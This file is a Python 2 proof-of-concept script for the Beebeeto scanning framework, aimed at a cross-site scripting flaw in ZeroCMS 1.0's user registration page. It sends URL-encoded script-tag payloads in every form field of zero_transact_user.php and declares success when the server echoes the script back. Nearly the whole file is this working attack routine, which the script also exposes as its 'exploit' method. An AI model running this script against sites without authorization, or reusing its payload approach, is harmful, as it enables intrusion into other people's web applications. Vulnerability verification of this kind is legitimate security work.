#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0039',
            'name': 'ZeroCMS 1.0 /zero_transact_user.php 跨站脚本漏洞 POC',
            'author': '1024',
            'create_date': '2014-09-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ZeroCMS', 
            'vul_version': ['1.0'],
            'type': 'Cross Site Scripting',
            'tag': ['ZeroCMS', 'xss', '跨站脚本漏洞'],
            'desc': 'ZeroCMS用户注册页面zero_transact_user.php表单完全没进行过滤。',
            'references': ['http://www.exploit-db.com/exploits/34170/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/zero_transact_user.php'
        verify_data = 'name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&email=%3Cscript%3E'\
                'alert%28123%29%3C%2Fscript%3E&password_1=%3Cscript%3Ealert%28123%29%3C%2Fscript'\
                '%3E&password_2=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&action=Create+Account'
        request = urllib2.Request(verify_url, data=verify_data)
        response = urllib2.urlopen(request)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST: ' + verify_data
        content = response.read()
        if "Duplicate entry '<script>alert(123)</script>' for key 'email'" in content:
            args['success'] = True
            args['poc_ret']['xss_url'] = verify_url
            return args
        else:
            args['success'] = False
            return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
